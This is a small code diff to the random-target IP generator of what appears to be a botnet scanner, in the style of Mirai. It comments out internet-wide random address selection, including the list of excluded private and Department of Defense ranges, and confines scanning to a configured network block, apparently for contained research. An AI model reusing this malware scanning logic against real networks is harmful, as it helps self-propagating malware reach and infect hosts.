@@ -675,8 +675,10 @@ static ipv4_t get_random_ip(void)
 {
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
+    /* [SAVYO] */
+    /* Changes made to contain address randomization in a controlled network block */
 
-    do
+    /*do
     {
         tmp = rand_next();
 
@@ -698,8 +700,16 @@ static ipv4_t get_random_ip(void)
           (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
           (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
+    );*/
 
+    tmp = rand_next();
+
+    o1 = 0xff & ((tmp & ~(SCAN_DST_MASK >> 24)) | (SCAN_DST_1 & (SCAN_DST_MASK >> 24)));
+    o2 = 0xff & (((tmp >> 8) & ~(SCAN_DST_MASK >> 16)) | (SCAN_DST_2 & (SCAN_DST_MASK >> 16)));
+    o3 = 0xff & (((tmp >> 16) & ~(SCAN_DST_MASK >> 8)) | (SCAN_DST_3 & (SCAN_DST_MASK >> 8)));
+    o4 = 0xff & (((tmp >> 24) & ~(SCAN_DST_MASK)) | (SCAN_DST_4 & SCAN_DST_MASK));
+
+    /* [/SAVYO] */
     return INET_ADDR(o1,o2,o3,o4);
 }
 
